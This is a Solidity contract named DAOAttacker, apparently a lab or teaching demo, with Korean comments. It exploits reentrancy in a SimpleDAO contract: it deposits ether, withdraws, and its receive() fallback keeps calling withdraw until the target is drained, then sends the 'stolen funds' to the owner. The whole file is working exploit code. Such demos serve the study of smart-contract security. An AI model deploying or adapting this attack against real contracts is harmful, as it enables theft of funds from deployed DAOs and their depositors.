// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SimpleDAO.sol";

contract DAOAttacker {
    SimpleDAO public target;
    address public owner;
    uint256 public attackAmount;

    constructor(address _target) {
        target = SimpleDAO(_target);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 0, "Need ETH to attack");

        attackAmount = msg.value;

        // 먼저 DAO에 돈을 예치한다
        target.donate{value: msg.value}();

        // 예치한 돈을 출금하면서 공격 시작
        target.withdraw(msg.value);
    }

    receive() external payable {
        // DAO에 아직 돈이 남아 있으면 다시 withdraw 호출
        if (address(target).balance >= attackAmount) {
            target.withdraw(attackAmount);
        }
    }

    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Only owner");
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
